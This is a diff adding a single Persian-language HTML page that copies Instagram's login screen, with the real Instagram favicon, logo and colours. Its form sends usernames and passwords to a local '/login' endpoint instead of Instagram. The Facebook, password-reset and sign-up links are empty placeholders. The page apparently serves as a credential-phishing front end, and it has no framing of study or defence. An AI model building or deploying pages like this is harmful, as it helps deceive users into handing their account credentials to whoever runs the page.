@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram • ورود</title>
+<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+* {box-sizing: border-box; margin:0; padding:0;}
+body {
+  font-family: 'Roboto', sans-serif;
+  background-color: #fafafa;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+.left-image {display: none;}
+.container {
+  background-color: #fff;
+  border:1px solid #dbdbdb;
+  border-radius:8px;
+  padding:40px 30px;
+  width:100%;
+  max-width:360px;
+  text-align:center;
+}
+.logo {
+  background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png') no-repeat center/contain;
+  width:175px;
+  height:51px;
+  margin:0 auto 12px;
+}
+.subtitle {
+  font-size:16px;
+  color:#8e8e8e;
+  margin-bottom:20px;
+}
+input {
+  width:100%;
+  padding:10px 8px;
+  margin-bottom:12px;
+  border:1px solid #dbdbdb;
+  border-radius:4px;
+  background-color:#fafafa;
+  font-size:14px;
+  transition: border-color 0.2s;
+}
+input:focus {
+  outline:none;
+  border-color:#a8a8a8;
+}
+button {
+  width:100%;
+  padding:10px 0;
+  background:linear-gradient(90deg,#405de6,#5851db,#833ab4,#c13584,#e1306c,#fd1d1d);
+  color:white;
+  font-weight:bold;
+  border:none;
+  border-radius:4px;
+  cursor:pointer;
+  margin-top:10px;
+  transition:opacity 0.2s, transform 0.2s;
+}
+button:hover {
+  opacity:0.9;
+  transform: translateY(-1px);
+}
+.divider {
+  display:flex;
+  align-items:center;
+  text-align:center;
+  color:#8e8e8e;
+  margin:15px 0;
+}
+.divider::before, .divider::after {
+  content:'';
+  flex:1;
+  border-bottom:1px solid #dbdbdb;
+  margin:0 10px;
+}
+.fb-login {
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:#385185;
+  font-weight:bold;
+  margin-top:10px;
+  cursor:pointer;
+  font-size:14px;
+  text-decoration:none;
+}
+.fb-login img {width:18px; height:18px; margin-left:6px;}
+.links {
+  margin-top:15px;
+  font-size:12px;
+  color:#00376b;
+}
+.links a {text-decoration:none; color:#00376b; margin:0 5px;}
+.links a:hover {text-decoration: underline;}
+
+@media (min-width:768px){
+  body {flex-direction: row;}
+  .left-image {
+    display:block;
+    width:50%;
+    height:100vh;
+    background:url('https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e') no-repeat center/cover;
+  }
+  .container {margin:50px;}
+}
+</style>
+</head>
+<body>
+  <div class="left-image"></div>
+  <div class="container">
+    <div class="logo"></div>
+    <div class="subtitle">با دوستان و خانواده در ارتباط باشید</div>
+    <form id="loginForm" action="/login" method="POST">
+      <input type="text" placeholder="نام کاربری" name="username" required>
+      <input type="password" placeholder="رمز عبور" name="password" required>
+      <button type="submit">ورود</button>
+    </form>
+    <div class="divider">یا</div>
+    <a class="fb-login" href="#">
+      ورود با فیسبوک
+      <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook">
+    </a>
+    <div class="links">
+      <a href="#">فراموشی رمز؟</a> | <a href="#">ثبت‌نام</a>
+    </div>
+  </div>
+</body>
+</html>
